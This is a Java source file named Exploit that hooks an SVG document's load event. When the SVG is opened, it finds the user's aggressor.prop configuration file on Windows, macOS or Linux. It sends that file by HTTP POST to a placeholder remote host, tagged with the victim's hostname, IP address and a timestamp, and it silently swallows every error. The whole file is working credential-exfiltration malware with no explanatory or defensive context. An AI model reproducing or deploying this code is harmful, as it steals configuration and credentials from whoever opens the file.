import org.w3c.dom.events.Event;
import org.w3c.dom.events.EventListener;

import org.w3c.dom.svg.EventListenerInitializer;
import org.w3c.dom.svg.SVGDocument;
import org.w3c.dom.svg.SVGSVGElement;

import java.util.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;


public class Exploit implements EventListenerInitializer {
    public Exploit() {
    }

    public void initializeEventListeners(SVGDocument document) {
        SVGSVGElement root = document.getRootElement();
        EventListener listener = new EventListener() {
        public void uploadFile(String ostype) throws IOException {
        String url = "http://xxxx/";
        String username = "xxxxx";
        String password = "xxxxxx";
        String charset = "UTF-8";
        String file="";
        File binaryFile = null;
        if (ostype == "win")
        {
             file = System.getProperty("user.home")+"\\.aggressor.prop";
             binaryFile = new File(file);
             if (!binaryFile.exists())
             {
                 file = System.getProperty("user.dir")+"\\aggressor.prop";
                 binaryFile = new File(file);

             }
        }
        else
        {

            file = System.getProperty("user.dir")+"/aggressor.prop";
            binaryFile = new File(file);


        }


        InetAddress ia = InetAddress.getLocalHost();
        SimpleDateFormat sdf = new SimpleDateFormat();
        sdf.applyPattern("yyyyMMddHH_mm_ss");
        Date date = new Date();

        String confname = ia.getHostName()+"_"+ia.getHostAddress()+"_"+sdf.format(date)+".conf";

        String auth = username + ":" + password;
        String encodedAuth = Base64.getEncoder().encodeToString(auth.getBytes());

        String boundary = Long.toHexString(System.currentTimeMillis());

        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        connection.setRequestProperty("Authorization", "Basic " + encodedAuth);
        OutputStream output = connection.getOutputStream();
        PrintWriter writer = new PrintWriter(new OutputStreamWriter(output, charset), true);

        writer.append("--" + boundary).append("\r\n");
        writer.append("Content-Disposition: form-data; name=\"file\"; filename=\""+confname+"\"").append("\r\n");
        writer.append("Content-Type: " + connection.guessContentTypeFromName(binaryFile.getName())).append("\r\n");

        writer.append("Content-Transfer-Encoding: binary").append("\r\n");
        writer.append("\r\n").flush();
        FileInputStream inputStream = new FileInputStream(binaryFile);
        byte[] buffer = new byte[4096];
        int bytesRead = -1;
        while ((bytesRead = inputStream.read(buffer)) != -1) {
                output.write(buffer, 0, bytesRead);
        }
        output.flush();
        inputStream.close();

        writer.append("\r\n").flush();
        writer.append("--" + boundary + "--").append("\r\n").flush();


        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
//        String response;
//        while ((response = in.readLine()) != null) {
//                System.out.println(response);}
    }

            public void handleEvent(Event event) {
                try {
                    String OS = System.getProperty("os.name", "unknown").toLowerCase(Locale.ROOT);
                    if (OS.contains("win")) {
                        this.uploadFile("win");

                        
                    } else if (OS.contains("mac")) {

                        this.uploadFile("mac");


                    } else if (OS.contains("nux")) {
                        this.uploadFile("linux");
                    }
                } catch (Exception e) {}
            }
        };
        root.addEventListener("SVGLoad", listener, false);
    }
    

}